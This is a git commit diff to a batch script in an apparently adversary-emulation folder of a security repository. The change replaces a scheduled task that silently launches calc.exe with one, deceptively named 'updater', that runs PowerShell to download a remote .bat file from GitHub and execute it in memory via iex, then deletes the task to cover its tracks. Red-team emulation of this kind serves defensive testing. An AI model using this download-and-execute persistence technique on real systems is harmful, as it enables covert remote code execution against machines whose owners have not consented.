19a01fcc3f6b1f28074605b23ebf7e5450b843bf
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-08-28 09:35:44 -0700

    Update taskSchedular.bat

--- Adversary Emulation/taskSchedular.bat
+++ Adversary Emulation/taskSchedular.bat
@@ -1,10 +1,11 @@
-schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater /F"
+:: schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater /F"
 
-:: schtasks /CREATE /SC MINUTE /TN updater /TR "curl.exe -kL <inserturl to vmchecker.bat>; schtasks /DELETE /TN updater /F"
+schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c 'iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/vmchecker.bat -UseBasicParsing).Content'; schtasks /DELETE /TN updater /F"
 
 timeout /t 240
 
 schtasks /DELETE /TN updater /F
+
 
 
 
